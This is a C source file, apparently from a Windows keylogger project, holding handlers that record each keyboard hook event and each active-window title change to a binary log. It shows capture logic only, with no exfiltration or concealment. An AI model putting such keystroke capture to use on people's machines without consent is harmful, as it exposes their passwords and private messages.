//
// Created by netdex on 12/1/2017.
//

#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <tracker.h>
#include <event.h>
#include <log.h>

#include "event.h"

void OnLogBegin() {

}

void OnKeyboardEvent(WPARAM msgid, KBDLLHOOKSTRUCT *kbdllh) {
    keyb_ev_t kbev = {
            (uint16_t) msgid,
            (uint8_t) kbdllh->vkCode,
            (uint8_t) kbdllh->flags
    };
    event_t e = {(uint32_t) time(NULL), EVENT_KEYBOARD, &kbev};
    log_event(&e);
    log_trace("keyboard event, %d ", (uint8_t) kbdllh->vkCode);
}

void OnActiveWindowTitleChanged(char *title) {
    log_trace("window change event, %s", title);
    uint32_t len = strlen(title);
    msg_ev_t *wev = calloc(sizeof(*wev) + len * sizeof(wev->msg[0]), 1);
    wev->len = len;
    memcpy(wev->msg, title, len);
    event_t e = {(uint32_t) time(NULL), EVENT_WINDOW, wev};
    log_event(&e);
    free(wev);
}

void log_event(event_t *e) {
    log_write(&e->type, sizeof(e->type), 1);
    switch (e->type) {
        case EVENT_KEYBOARD: {
            keyb_ev_t *m = (keyb_ev_t *) e->event;
            log_write(m, sizeof(keyb_ev_t), 1);
            break;
        }
        case EVENT_WINDOW:
        case EVENT_MESSAGE: {
            msg_ev_t *m = (msg_ev_t *) e->event;
            log_write(m, sizeof(msg_ev_t) + m->len * sizeof(m->msg[0]), 1);
            break;
        }
        default:break;
    }
}